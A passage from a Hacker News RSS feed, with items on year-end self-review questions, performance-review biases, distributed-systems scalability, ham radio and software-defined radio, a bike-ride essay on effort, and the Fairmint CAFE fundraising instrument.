<li><span>I keep my job description as a living document to capture what I take on and hand off over time. When I doubt where my time is being spent, I discuss this document with my boss and adjust accordingly.</span></li>
</ul>
<li><span>How were my 1:1s with my boss? Did I come to the meeting with thoughtful questions and specific to-dos?&nbsp;</span></li>
<li><span>Did I listen to and incorporate feedback effectively?</span></li>
<li><span>Did I step up when I needed to? Did I delegate my areas of weakness?</span></li>
</ul>
<h5><strong>Role</strong></h5>
<ul>
<li><span>How do I want my job description to change in the next year based on what the company needs and on my own strengths and weaknesses?</span></li>
<li><span>Which relationships within the company are most important to my efficacy? Can I do anything to improve upon those relationships?</span></li>
<li><span>Which tasks I should be taking on or offloading?</span></li>
</ul>
<h5><strong>Time</strong></h5>
<ul>
<li><span>Am I spending time on </span><a href="https://www.nfx.com/post/time-management-for-founders/"><span>the most valuable things</span></a><span> and letting the unimportant things fall through the cracks?</span></li>
<li><span>What have I been putting off?&nbsp;</span>
<ul>
<li><span>Can I eliminate it or delegate it?</span></li>
<li><span>Can I give it more clarity?</span></li>
</ul>
</li>
<ul>
<li><span>I tend to dread tasks that either feel pointless or excessively vague, so I ask:&nbsp;&nbsp;</span></li>
</ul>
<li><span>What can I stop doing altogether?</span></li>
</ul>
<h5><strong>Personal</strong></h5>
<ul>
<li><span>Do I like my personal systems for keeping track of to-dos?</span></li>
<li><span>Do I know what I bring to the table when I join a meeting?</span></li>
<li><span>Am I maintaining a network of people I can turn to for advice?</span></li>
<li><span>Am I making time outside of work for activities that keep me healthy and happy?</span></li>
</ul>
</div></div>]]>
            </description>
            <link>https://boringstartupstuff.com/newsletter/nov-24th-2020-finish-the-year-strong</link>
            <guid isPermaLink="false">hacker-news-small-sites-25199785</guid>
            <pubDate>Tue, 24 Nov 2020 16:16:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Harmful Biases in Performance Reviews]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25199752">thread link</a>) | @ochronus
<br/>
November 24, 2020 | https://ochronus.online/biases-in-performance-reviews/ | <a href="https://web.archive.org/web/*/https://ochronus.online/biases-in-performance-reviews/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<div itemprop="text">

<p>We are all prone to biases. We cannot help but evaluate and assess people and situations through the lens of our own prejudices. When it comes to performance reviews this can have a huge unwanted impact as it influences compensation, promotion decisions, and even firing.</p>
<p>When you give a performance review for a colleague, you’re very directly impacting their career trajectory. Even so, if you’re their manager. Given the weight of this kind of influence, it’s our responsibility to make sure the reviews are as fair and objective as possible.&nbsp;</p>
<p>Not all is lost, though. Once you’re aware of the existence of these biases and the way they work, you can utilize certain strategies (and a good amount of self-awareness) to minimize their effect.</p>
<p>Below, I break down the most common performance review biases and share advice on how to deal with them both as the giver and the recipient of performance reviews.&nbsp;</p>

<h4 id="0-general-advice-for-managers-"><strong>General advice for managers</strong></h4>
<p>One of the best ways to counter bias in reviews is to come up with a great review format that guides people and doesn’t magnify bias effects. Phrasing matters a lot. Setting the tone, being clear about the purpose and scope of the feedback form is key.</p>
<p>Another very important point is to understand that giving quality feedback takes time, a certain kind of focus, and is a considerable effort. Make sure you proactively prepare your engineers for the feedback season and plan for it – one thing that worked pretty well for me is to represent feedback tasks as cards on the team board and even set them as sprint goals. Nothing makes feedback quality deteriorate more than rushing and feeling that you don’t have enough time for it. You can organize feedback training, too, with our without your HR peers.</p>
<h4 id="1-general-advice-for-everyone-"><strong>General advice for everyone</strong></h4>
<p>On the flip side of the above – expect that giving feedback is not a trivial task. Take your time, make sure you have a quiet corner, don’t do it in one go, take notes, work on your wording, look at email/slack/pull request history too and treat your peers as customers of your feedback.</p>
<p><a href="https://ochronus.online/thoughts-on-feedback/">My article on feedback</a> might help in that.</p>
<hr>
<h2 id="2-recency-bias">Recency bias</h2>
<p>Alice had a very strong year, she had great contributions to the projects her team was working on, achieved most of her goals, mastered a new language, and a framework. In the past month though, due to personal issues, she kept her involvement to the bare minimum. In his feedback to Alice, Bob highlights that he expects more from her and that she feels distant from the team. Bob completely fails to call out the amazing job Alice did earlier and the growth she had had.</p>
<p>Recency bias is when recent events weigh much more heavily in your performance review than older, possibly even more significant events. This is partly due to how our memory works and is a completely natural thing, yet its impact can be really bad and can bias your review in either direction depending on what people remember about you recently.&nbsp;</p>
<h3 id="3-how-to-deal-with-recency-bias">How to deal with recency bias</h3>
<p>The best way is to collect feedback more frequently – for example, do a 360 each quarter even if you only have the performance review once a year. Project-level retrospectives can be helpful as well. Some managers keep ‘files’ on their engineers to counter this bias, but honestly, that can easily backfire – it can feel like a shady practice to their teams. Prefer transparent and open frequent feedback instead.</p>
<p>Some people find it useful to keep a personal achievement log, which helps with their self-assessment or calling out things missing from their feedback. If you feel there are important bits missing from the feedback you’ve been given, call those out. If your manager doesn’t encourage more frequent feedback you can still ask for informal ones from your peers at any time.</p>
<hr>
<h2 id="4-similarity-bias-and-affinity-bias">Similarity bias and Affinity bias</h2>
<p>Alice and Bob graduated from the same university and are both huge Star Trek fans – they talk about it all the time, they get along really well and connect outside work, too. Bob’s feedback to Alice is always overly positive and he’s prone to overlooking seemingly obvious gaps in her performance.&nbsp;</p>
<p>We subconsciously tend to rate people similar to us higher. Similarity can mean many things – personality, looks, way of thinking, etc. Affinity bias occurs when we work with someone we feel we have an affinity with; maybe we attended the same college, we grew up in the same town, or they remind us of someone we know and like.</p>
<h3 id="5-how-to-deal-with-similarity-and-affinity-bias">How to deal with similarity and affinity bias</h3>
<p>A clear, and transparent performance evaluation system helps a lot here. Such a system is clear and well-understood level definitions, which can guide your focus while thinking about others’ performance. That said, levels are usually not public information in companies, so this won’t help too much with peer review.</p>
<p>Getting feedback from multiple peers can help mitigate the effect of this bias.</p>
<hr>
<h2 id="6-halo-effect-and-horn-effect">Halo effect and horn effect</h2>
<p>Alice is really great at debugging and fixing notoriously tricky bugs others usually struggle with. Because of this, she saved the day multiple times. That said, she barely meets her level’s expectations if we look at the wider spectrum. Alice gets really positive feedback from her team highlighting how grateful they are for her being the ‘bug hunter’ and omitting any gaps she might have elsewhere.</p>
<p>Bob meets his level’s expectations in general and is great to work with. That said, he has the tendency to be impatient and cut discussions short because of that, which really hurts his ability to effectively work with others in these situations. Bob gets negative feedback highlighting that he should really work on his temper and communication – not mentioning any of the amazing work he’s done otherwise.</p>
<p>In the halo effect, a single positive event or attribute lifts your review up, and in the horn effect similarly a single negatively perceived action or trait ‘poisons’ your whole review.</p>
<p>This gets even worse if your manager is biased. A classic example of the manager having a halo bias is when they see one of their engineers as the “hero” or the “10x engineer”, being blind about any gaps they might have (btw. check out my older post about <a href="https://ochronus.online/kill-your-heroes/">hero engineers</a>). An example of a manager having the horn bias is when they stigmatize an engineer as e.g. “unreliable” or “not smart enough” based on a one-off event.</p>
<h3 id="7-how-to-counter-the-halo-or-horn-effects">How to counter the halo or horn effects</h3>
<p>You might ask “why would I want to counter the halo effect if it results in positive reviews about me?”. True, it might momentarily be even helpful for you, but not having a clear picture of your gaps ultimately does more damage than good to your career. It hinders your potential to grow and if you change teams, managers, or companies you might be suddenly underperforming and you won’t necessarily understand what happened.</p>
<p>To counter the effect of these biases you first need to understand what the main positive or negative thing is in your feedback and have a heart-to-heart about it with yourself. Again, a proper level definition system helps a lot. If you feel that people are generalizing a one-off negative event, ask them to provide more examples of that behavior. You can actually call out that you feel stigmatized by that single event or trait. If you can, highlight counterexamples.</p>
<p>Sometimes phrasing of rating scale points helps mitigate these biases, e.g. if you call the two extremes of the scales “consistently underperforming” and “top performer”.</p>
<hr>
<h2 id="8-idiosyncratic-rater-bias">Idiosyncratic rater bias</h2>
<p>Bob is an engineering manager leading a mobile developer team. Bob has deep experience in project management but almost none in mobile development. Bob seems to consistently rate the development skills of his engineers much higher than they really are, while he rates the project management performance of the lead developer lower than it is.</p>
<p>Idiosyncratic rater bias happens when people evaluate skills they’re not good at, higher. Sometimes they rate others lower in things they’re great at. This is rooted in lower standards we have for things we don’t have deep knowledge about and higher standards for things we’re experienced at. In other words, our feedback reflects more on our own skills than the person’s we’re reviewing.</p>
<h3 id="9-how-to-counter-the-idiosyncratic-rater-bias">How to counter the idiosyncratic rater bias</h3>
<p>To overcome this bias as a manager, try rephrasing your performance evaluation questions for yourself from a different perspective, e.g.:</p>
<p>If this engineer wanted to resign I would try to retain them.</p>
<p>I would want this engineer on my team at any time.</p>
<p>I would hire this engineer again at any time.&nbsp;</p>
<p>Research shows that people are much more accurate when rating their own intentions compared to rating other people.</p>
<p>Also, having a diverse set of feedback from peers can mitigate this (there’s a low probability for every reviewer to be biased the same way).</p>
<hr>
<h2 id="10-centrality-bias">Centrality bias</h2>
<p>Alice is the manager of a team. She hands in her annual performance evaluations, and you notice that almost everyone on her team scored near the middle of the scale. Now you wonder if that’s actually a realistic image or not.</p>
<p>Many managers don’t like being extreme and tend to be moderate in their reviews. When everyone is receiving a rating of 3 out of 5 across the board, there’s no distinguishing the low-performing and high-performing employees. This will result in unfair reviews and people being pissed by lack of recognition and that nothing happens to low performers.&nbsp;</p>
<h3 id="11-how-to-counter-the-centrality-bias">How to counter the centrality bias</h3>
<p>Well, an easy hack is to remove the middle of the rating scale, the ‘neutral’ option, e.g. have a scale of 4 instead of 5 to force managers to decide. If you received one of the ‘meh’ reviews, have a heart-to-heart with your manager and highlight where you disagree. For example, if you feel you’ve been doing better in a certain area ask for explicit examples of how you could do better and cross-check it with your data points. Rating on multiple skills and axes can help, too, compared to a single, unified rating.&nbsp;</p>
<h2 id="12-contrast-bias">Contrast bias</h2>
<p>Alice is really good at project management. Bob is …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ochronus.online/biases-in-performance-reviews/">https://ochronus.online/biases-in-performance-reviews/</a></em></p>]]>
            </description>
            <link>https://ochronus.online/biases-in-performance-reviews/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25199752</guid>
            <pubDate>Tue, 24 Nov 2020 16:14:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Scalability Patterns of Distributed Systems]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25199689">thread link</a>) | @parsecs
<br/>
November 24, 2020 | https://robertovitillo.com/scalability-patterns/ | <a href="https://web.archive.org/web/*/https://robertovitillo.com/scalability-patterns/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><header><p>November 24, 2020</p></header><p>The simplest way to scale an application is by running it on more expensive hardware. But, that only brings you so far as the application will eventually reach a performance ceiling. The alternative to scaling up is scaling out by distributing the load over multiple nodes. </p><p>I have released a new chapter of <a href="https://distributedsystemsmanual.com/">the Distributed Systems Manual</a>, which introduces the different levers you can use to design a horizontally scalable application. The chapter explores three categories of patterns, which are independent of each and can be combined within the same application: functional decomposition, partitioning, and duplication.</p><h2 id="functional-decomposition"><a href="#functional-decomposition" aria-label="functional decomposition permalink"></a>Functional Decomposition</h2><p>Functional decomposition is the process of taking an application and breaking it down into individual parts. Think of the last time you wrote some code - you most likely decomposed it into functions, classes, and modules. The same idea can be taken further by decomposing an application into separate services, each with its well-defined responsibility. Decomposing an application into services doesn’t come for free, though, and the chapter talks about the costs of doing so. </p><p>The chapter also dives into patterns that become crucial once your application is split into multiple services, such as using an API gateway to shield external consumers from the internal APIs and leveraging asynchronous messaging to improve the overall system’s availability.</p><h2 id="duplication"><a href="#duplication" aria-label="duplication permalink"></a>Duplication</h2><p>Arguably the easiest way to add more capacity to a service is to create more instances of it and have some way of routing - or balancing - requests to them. The thinking is that if one instance has a capacity of X, then two instances should have a capacity that is twice that. </p><p>Creating more service instances can be a fast and cheap way to scale out a stateless service, as long as you have taken into account the impact this can have on the service’s dependencies. For example, suppose every service instance needs to access a shared data store. In that case, eventually, the data store will become a bottleneck, and adding more service instances to the system will only strain the data store further. </p><p>Scaling out a stateful service is significantly more challenging as coordination is needed to replicate the state across servers. The chapter introduces the concept of load balancing by discussing the implementation of L4 and L7 load balancers. Then, various approaches to state replication are explored, like single-leader, multi-leader, and leaderless. Finally, the chapter explores how to implement caching and content distribution at scale.</p><h2 id="partitioning"><a href="#partitioning" aria-label="partitioning permalink"></a>Partitioning</h2><p>When a dataset no longer fits a single node, it needs to be partitioned - or sharded - across multiple nodes. Sharding is a general technique that can be used in a variety of circumstances. The chapter discusses different sharding strategies and their relative trade-offs and explores how to rebalance partitions when new nodes are added to the system.</p><p><span>
      <a href="https://robertovitillo.com/static/36007df3454b93db0383ef2ec08c67fa/0f903/partitions.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Partitions and Replication" title="Partitions and Replication" src="https://robertovitillo.com/static/36007df3454b93db0383ef2ec08c67fa/fcda8/partitions.png" srcset="https://robertovitillo.com/static/36007df3454b93db0383ef2ec08c67fa/12f09/partitions.png 148w,https://robertovitillo.com/static/36007df3454b93db0383ef2ec08c67fa/e4a3f/partitions.png 295w,https://robertovitillo.com/static/36007df3454b93db0383ef2ec08c67fa/fcda8/partitions.png 590w,https://robertovitillo.com/static/36007df3454b93db0383ef2ec08c67fa/efc66/partitions.png 885w,https://robertovitillo.com/static/36007df3454b93db0383ef2ec08c67fa/c83ae/partitions.png 1180w,https://robertovitillo.com/static/36007df3454b93db0383ef2ec08c67fa/0f903/partitions.png 1719w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
  </a>
    </span></p><hr></article></div>]]>
            </description>
            <link>https://robertovitillo.com/scalability-patterns/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25199689</guid>
            <pubDate>Tue, 24 Nov 2020 16:09:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ham Radio Needs to Embrace the Hacker Community Now More Than Ever]]>
            </title>
            <description>
<![CDATA[
Score 36 | Comments 9 (<a href="https://news.ycombinator.com/item?id=25199686">thread link</a>) | @parsecs
<br/>
November 24, 2020 | https://www.kj7nzl.net/blog/ham-radio-needs-to-embrace-the-hacker-community-now-more-than-ever/ | <a href="https://web.archive.org/web/*/https://www.kj7nzl.net/blog/ham-radio-needs-to-embrace-the-hacker-community-now-more-than-ever/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="content-pane">
  <div>
    
    <h2 id="an-open-letter-to-all-ham-radio-operators">An Open Letter To All Ham Radio Operators</h2>
<p>“Ham Radio is dying!” A phrase all to often uttered that it’s become cliché, but it’s partly true. You can’t deny a considerable section of the ham radio operators in the world are in the latter part of their lives.They won’t be around forever so naturally new people must assume their place. The good news is amateur radio licenses are on the rise. The bad news is the people induced to ham radio these days aren’t interested in pushing the limits of RF technology. To be blunt I’m talking about preppers and those solely interested in emergency communications. Neither of which have any desire to explore ham radio beyond a disaster fetish in which they use their $25 BaoFeng HT to save the world. So what can ham radio operators do? Easy, reach out to the hacker community! First, allow me define the word hacker since there are nefarious connotations of the word’s meaning. When I use the word hacker, I’m talking about the type of individual who wants to comprehend how a given technology works and who explores all the possibilities that technology has to offer. These are the people who grew up dismantling electronics just to appreciate how they work, the people who stayed up late into the night teaching themselves to code, and these are the people ham radio needs to propel it further into the future. To attract and retain hackers within the ham community there are a few things that we need to do.</p>
<h3 id="1-stop-primarly-promoting-emergency-communications">1. Stop Primarly Promoting Emergency Communications</h3>
<p>Every day I see on the <a href="https://www.reddit.com/r/amateurradio/">r/amateurradio</a> subreddit a number of people who solely promote ham radio’s role in emergency communications. Does it have a place within the hobby and community? Certainly, however, there is little interest from the hacker community in relaying messages about the state of the weather during a thunderstorm. Ham radio offers so much morel. You do it a disservice when you either dismiss the other areas of the hobby as secondary to emergency communications or fail to mention them at all. For crying out loud, we launch our own communications satellites and utilize them every day. Satellite communications, the blending of RF and VoIP to communicate around the world, software defined radio represent the things we need to promote to the hacker community. To effectively communicate, identify your audience.</p>
<h3 id="2-start-promoting-software-defined-radio">2. Start Promoting Software Defined Radio</h3>
<figure>
    <img src="https://www.kj7nzl.net/img/radios/hackrf-one-sdr-001.webp" alt="Will SDRs like the HackRF One be the future of ham radio?"> <figcaption>
            <p>Will SDRs like the HackRF One be the future of ham radio?</p>
        </figcaption>
</figure>

<p>There is a lot of interesting work that’s currently being done within the hacker community with RF. Most of this work is currently centered around WiFi, LoRa, IoT networks. It not difficult to imagine someone who has an interest in these communication technologies wouldn’t be open to software defined radio. They just need to be presented with easy to understand examples and a little encouragement to become licensed. Kelly Albrink’s 2020 DerpCon talk <em>Ham Hacks: Breaking into the World of Software Defined Radio</em> does just that.</p>

<p>
  <iframe src="https://www.youtube.com/embed/LIcE0frWtLo" allowfullscreen="" title="YouTube Video"></iframe>
</p>

<p>Software Defined Radio is here and we as hams need to explore all the potential the technology has to offer. Currently full SDR transceivers are available from Flex Radio, and the major ham radio manufactures are beginning to produce hybrid SDR transceivers. With SDRs such as the BladeRF 2.0, LimeSDR and the HackRF One the entry point into software defined radio is relatively low. These lowcost SDRs make excellent platforms for experimentation within the VHF/UHF bands. The <a href="https://www.youtube.com/c/TechMindsOfficial">YouTube channel Tech Minds</a> has some excellent videos of what these little radios can do.</p>

<p>
  <iframe src="https://www.youtube.com/embed/qx_orXHiQk8" allowfullscreen="" title="YouTube Video"></iframe>
</p>

<h3 id="3-provide-communities-that-foster-technical-discussion-and-exploration">3. Provide Communities That Foster Technical Discussion and Exploration</h3>
<p>It’s been my experience that local radio club are more focused on emergency communications rather than the more technical aspects of ham radio (Seriously, why so much obsession with emergency communications?). Most of the anecdotal evidence I’ve collected has suggested this is a common occurrence around the United States. This type of focus doesn’t foster an environment of learning and exploration. Why would the hacker community want to participate, in discussions about who’s going provide communications “support” on the corner of Elm and Main St. during the annual Forth of July parade? You need to create the type of environment where the discussion is focused on RF technology. If you can’t do that locally in person or over the air, then it’s time to turn to the digital voice modes. That’s right, DStar, DMR, and System Fusion provide an opportunity to essentially create local communities of common interest. Access to these communities are as easy as connecting to one’s hotspot; I guess you could present the argument that some repeaters are connected to these digital networks and blah blah blah. Hotspots! That’s what the cool kids are doing these days. As an aside, <a href="https://www.kj7nzl.net/blog/building-my-own-lonestar-electronics-mmdvm-hotspot/">check out my new hotspot</a>.</p>
<h4 id="introducing-the-radio-hackers-ysf-reflector">Introducing the Radio Hackers YSF Reflector</h4>
<p>In my efforts to better understand the System Fusion and WiresX Network and how they relate to each other, I created a YSF Reflector called Radio Hackers. As you may have guessed this is the beginning stages of the hacker community, I’m fostering among ham radio operators. This is by nowhere complete and I welcome you to assist me in any way that you can. The most significant thing you can do is inform others and join in on the discussion on the reflector.</p>
<ul>
<li>ID: 33360</li>
<li>Name: Radio Hackers</li>
<li>Dashboard: <a href="http://hackers.ysf.kj7nzl.net/">http://hackers.ysf.kj7nzl.net</a></li>
<li>Bridged Networks: TBD</li>
</ul>
<p>If anyone knows more about bridging networks together with XLX please reach out to me. I’d love to speak with you more. My contact information is provided on the <a href="https://www.kj7nzl.net/">home page</a> of this site.</p>

  </div>
</section></div>]]>
            </description>
            <link>https://www.kj7nzl.net/blog/ham-radio-needs-to-embrace-the-hacker-community-now-more-than-ever/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25199686</guid>
            <pubDate>Tue, 24 Nov 2020 16:09:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Relax for the Same Result]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25199673">thread link</a>) | @svrma
<br/>
November 24, 2020 | https://sive.rs/relax | <a href="https://web.archive.org/web/*/https://sive.rs/relax">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

<article>
<header>
<div><p>from the book “<a href="https://sive.rs/n" rel="tag">Hell Yeah or No</a>”:</p></div>

<small>2015-10-02</small>
<audio src="https://m.sive.rs/sive.rs.relax.mp3" preload="none" controls="controls"></audio></header>

<p>
	A few years ago, I lived in Santa Monica, California, right on the beach.
</p><p>
	There’s a great bike path that goes along the ocean for seven and a half miles.
	So, fifteen miles round trip.
	On weekday afternoons, it’s almost empty.
	It’s perfect for going full speed.
</p><p>
	So a few times a week, I’d get on <a href="https://surlybikes.com/bikes/pacer">my bike</a> and go as fast as I could for the fifteen-mile loop.
	I mean really full-on, 100 percent, head-down, red-faced sprinting.
</p><p>
	I’d finish exhausted and look at the time:
<strong>
	forty-three minutes.
</strong>
	Every time.
	Maybe a minute more on a really windy day, but basically always forty-three minutes.
</p><p>
	After a few months, I noticed I was getting less enthusiastic about this bike ride.
	I think I had mentally linked it with being completely exhausted.
</p><p>
	So one day I decided <strong>I would do the same ride, but just chill</strong>.
	Take it easy, nice and slow.
	OK, not <em>super</em> slow, but dialing it back to about 50 percent of my usual effort.
</p><p>
	And ahhh… what a nice ride.
	I was relaxed and smiling and looking around.
	I was barely giving it any effort.
</p><p>
	I saw two dolphins in the water.
	A pelican flew right over me in Marina del Rey.
	When I looked up to say “wow!” he shit in my mouth.
	I can still remember that taste of digested shellfish.
	I had to laugh at the novelty of it.
</p><p>
	I’m usually so damn driven, always doing everything as intensely as I can.
	It was so nice to take it easy for once.
	I felt I could do this forever, without any exhaustion.
</p><p>
	When I finished, I looked at the time: <strong>forty-five minutes.</strong>
</p><p>
	Wait — what?!?
	How could that be?
	Yep.
	I double-checked: forty-five minutes, as compared to my usual forty-three.
</p><p>
	So apparently all of that exhausting, red-faced, full-on push-push-push I had been doing had given me only a <strong>4 percent</strong> boost.
	I could just take it easy and get <strong>96 percent of the results</strong>.
</p><p>
	And what a difference in experience!
	To go the <em>same</em> distance, in about the <em>same</em> time, but one way leaves me exhausted, and the other way, rejuvenated.
</p><p>
	I think of this often.
	When I notice that I’m all stressed out about something or driving myself to exhaustion, I remember that bike ride and try dialing back my effort by 50 percent.
	It’s been amazing how often everything gets done just as well and just as fast, with what <em>feels</em> like half the effort.
</p><p>
	Which then makes me realize that half of my effort wasn’t effort at all, but just unnecessary stress that made me <em>feel</em> like I was doing my best.
</p>
<img alt="" src="https://sive.rs/images/bikesand.jpg">



</article>



</div></div>]]>
            </description>
            <link>https://sive.rs/relax</link>
            <guid isPermaLink="false">hacker-news-small-sites-25199673</guid>
            <pubDate>Tue, 24 Nov 2020 16:07:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Continuous Agreement for Future Equity]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25199610">thread link</a>) | @simonpure
<br/>
November 24, 2020 | https://fairmint.co/cafe-continuous-agreement-for-future-equity/ | <a href="https://web.archive.org/web/*/https://fairmint.co/cafe-continuous-agreement-for-future-equity/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>The CAFE, or Continuous Agreement for Future Equity, is the result of years of experience from investors, lawyers and, of course, founders reflecting on today’s financing methods and looking to create a better way to fundraise that would be beneficial for investors, entrepreneurs and stakeholders at large. The CAFE has been thought with the following objectives in mind: give more control to founders, more liquidity to investors and more access to stakeholders.</p></div><div id="the-cafe"><div id="what-cafe"><p>A CAFE (pronounced /ka.fe/) is a Continuous Agreement for Future Equity. It allows investors to make cash investments in a company at any single time, but get company stock at a later date, in connection with a specific event. A CAFE is not a debt instrument, but is intended to be an alternative to convertible notes and SAFEs that is beneficial for both companies and investors.</p></div><div id="read-cafe"><p>Here is a <a href="https://fairmint-documents.s3.amazonaws.com/CAFE/CAFE+Template.docx" target="_blank">simple template</a> we’ve created as an example form of CAFE. Keep in mind, each Company may want to customize and amend the form of CAFE based on legal feedback, and using this template is not a requirement to conduct a CAFE offering. Also note, these are just templates and are not intended to constitute legal advice. You will still need to work with counsel or choose to forego working with counsel yourself.</p></div><div id="what-problem-cafe-solve"><div><p>The CAFE enables you to financially align your stakeholders to the success of your company. The digital economy has radically changed the nature of the relationship between customers and corporations. Individuals have switched from being passive consumers to being an essential force in creating value, either by their actual work (Airbnb, Uber, Apple's App Store, Amazon Marketplace...) or through their data (Facebook, Google...).</p><p>For that reason, financially aligning stakeholders to the success of the company is now the strongest competitive advantage that a company can build. Yet, there is no easy solution to do that today (see the letters sent by <a href="https://www.axios.com/airbnb-asks-sec-to-let-it-give-hosts-equity-a7d99495-0782-4bce-92bb-4c692ef1b621.html" target="_blank"><span>Airbnb</span></a> and <a href="https://www.axios.com/uber-asks-sec-to-let-it-give-equity-to-drivers-1539296399-4594e4e4-727f-4fae-873e-58df1ebd20d9.html" target="_blank"><span>Uber</span></a> to the SEC asking to let them give equity to their hosts and drivers respectively).</p><p>The CAFE has been created with the objective to turn equity into a company’s most powerful tool to engage with its community. On the one hand, the CAFE allows for <a href="http://www.paulgraham.com/hiresfund.html" target="_blank"><span>high-resolution fundraising</span></a> at scale, enabling anyone in the world who believes in a company (and who are not restricted by applicable laws) to invest in it, at any single time. On the other hand, the CAFE allows companies to better reward key stakeholders (users, customers, partners, drivers, hosts…) and incentivize them to their financial success.</p><p>More specifically, the CAFE addresses the expectations we gathered from hundreds of discussions with founders, investors and stakeholders:</p><ul><li><p>Founders want more long-term <b>control</b> of their company,</p></li><li><p>Stakeholders want <b>access</b> to the financial upside of the companies they love and use,</p></li><li><p>Investors want increased <b>liquidity</b> on their investments.</p></li></ul></div></div><div id="what-key-characteristics-cafe"><div><p>The CAFE has been designed to be an improvement over the SAFE. Like the SAFE, it allows for <a href="http://www.paulgraham.com/hiresfund.html" target="_blank"><span>high-resolution financing</span></a> but it has other key characteristics. Most notably, subject to applicable law (which may require the observation of holding periods or other securities law compliance requirements, depending on jurisdiction), it is designed to achieve three essential features:</p><ul><li><p><b>Accessible to Qualifying Investors and Stakeholders</b>. Anyone in the world who supports the company’s product or mission and qualifies to participate under applicable law is able to buy or earn CAFE, anytime, easily and online.</p></li><li><p><b>Digital</b>. The CAFE makes companies’ equity programmable. Using the CAFE, founders can create automated and scalable stakeholder incentivization plans to let their key stakeholders earn CAFE according to the rules they set. Software is finally eating equity.</p></li><li><p><b>More Liquid.</b> We created the CAFE as a standard digital security. As such, subject to applicable law, it has the potential to leverage decentralized <a href="https://medium.com/dragonfly-research/what-explains-the-rise-of-amms-7d008af1c399" target="_blank"><span>AMMs</span></a> as well as securities exchange platforms to enable easy trading of CAFE.</p></li></ul></div></div><div id="what-benefits-cafe"><p>The CAFE has many benefits over traditional equity offering while remaining compatible with traditional equity financings:</p><div><div><p>Traditional Equity Offering</p><p>CAFE Offering</p></div><div><p>Rights</p><p><span>Incremental dilution.</span> Every new round of financing makes you lose long-term control over the destiny of your company in the form of relinquishing governance and control rights.</p><p><span>Fixed.</span> Your CAFE offering has a fixed dilution, no matter how much capital you end up raising. On top, shares issued on conversion of a CAFE by default do not require relinquishing governance and control rights. You stay in control.</p></div><div><p>Management Focus</p><p><span>On fundraising.</span> Fundraising is a full-time job and distracts you from growing your business.</p><p><span>On the business.</span> Once launched, qualified investors can invest at any single time without you being involved in the granular details of the process.</p></div><div><p>Stakeholders Incentivization</p><p><span>Manual.</span> With traditional equity offerings, you usually create a stock option pool for employees, consultants or advisors but it’s near impossible to scale.</p><p><span>Automated.</span> A CAFE offering gives you the ability to create an automated and scalable stakeholder incentivization plan specific to your business</p></div><div><p>Investors Liquidity</p><p><span>Friction.</span> Unless you are a large company with lawyers, access to secondary markets, and an experienced team, it is challenging to enable liquidity for stakeholders and investors prior to an exit or IPO.</p><p><span>Easier.</span> A CAFE offering makes it easier to orchestrate the liquidity of your stakeholders, investors and yourself as secondary trading can happen compliantly on decentralized AMMs.</p></div><div><p>Typical Participants</p><p><span>Professional investors.</span> VC and business angels.</p><p><span>Professional investors &amp; everybody else.</span> Stakeholders, Seed &amp; Pre-seed VCs, business angels &amp; LPs.</p></div></div></div><div id="what-differences-cafe-safe"><p>As there are different types of SAFE, we’ll use a YC SAFE POST with valuation cap / no discount for the comparison. Regarding the CAFE, we’ll use the default CAFE template that Fairmint has made available.</p><div><div><p>Fundraising</p><p><span>One off.</span> Each SAFE issuance is a one-off financing event with its own negotiation phase, its own terms and a fixed amount of capital committed.</p><p><span>Continuous.</span> A CAFE offering is on a “set it and forget it” model. Once launched, qualified investors can invest on their own at any single time.</p></div><div><p>Price terms</p><p><span>Negotiated.</span> The valuation cap, the discount and pro-rata rights are subject to negotiation with every investor which creates friction in the fundraising process.</p><p><span>Automated and non-negotiable.</span> The price of a CAFE is a function of the number of CAFE purchased (the amount invested) and the number of CAFE already issued to investors (the more CAFEs already issued, the pricier), reducing negotiation friction and freeing founder time to focus on building. See “How is the price of a CAFE determined?”.</p></div><div><p>Amount raised</p><p><span>Fixed.</span> For every new SAFE issued, you raise a fixed amount of capital. To raise more capital, you need to issue more SAFE, which dilutes you more (see Dilution above).</p><p><span>Unlimited.</span> For a fixed dilution (see Dilution above), you can raise an unbounded amount of capital with a CAFE offering. New CAFEs are automatically issued (at a higher price calculated automatically) whenever there is demand from investors.</p></div><div><p>Conversion trigger</p><p><span>Equity financing event.</span> SAFEs typically convert into equity at the next equity financing event (a “priced round”). At that moment, the number of shares per SAFE investor is calculated using each SAFE’s valuation cap or discount based on the round’s terms. Calculating conversion can also be challenging due to different formulas for calculating valuation caps, adding confusion and complexity for founders.</p><p><span>Liquidity event.</span> CAFEs convert into equity when a liquidity event happens (IPO or sale of the company). At that moment, the number of shares per CAFE holder is calculated using the target equity percentage allocation of the CAFE offering and giving every CAFE holder its pro-rata share based on their CAFE holdings. The founders and their advisors do not need to worry about complex calculations, as all logic is executed automatically.</p></div><div><p>Converts to</p><p><span>Preferred stocks.</span> SAFEs convert to preferred stock, which is typically the same series of stock with the same rights as the stock being purchased by new investors in a priced round.</p><p><span>Non-voting preferred stocks</span> By default, CAFEs convert to a separate series of non-voting preferred stocks with 1x non-participating liquidation preference 